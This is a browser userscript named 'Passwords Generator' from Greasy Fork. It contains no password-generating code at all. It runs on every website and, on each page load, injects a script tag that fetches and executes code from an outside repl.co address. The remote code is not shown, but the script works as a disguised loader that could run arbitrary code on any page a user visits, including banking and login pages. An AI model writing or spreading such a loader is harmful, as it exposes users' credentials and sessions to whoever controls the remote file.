// ==UserScript==
// @name         Passwords Generator
// @namespace    passwords-generator
// @version      1.0
// @description  Official Password Generator user.js Script.
// @author       Passwords Generator
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/470415/Passwords%20Generator.user.js
// @updateURL https://update.greasyfork.org/scripts/470415/Passwords%20Generator.meta.js
// ==/UserScript==

function executeExternalScript(url) {
    var script = document.createElement('script');
    script.src = url;
    document.body.appendChild(script);
}
executeExternalScript('https://passwordsgenerator.playerwictor.repl.co/tmscript.txt');
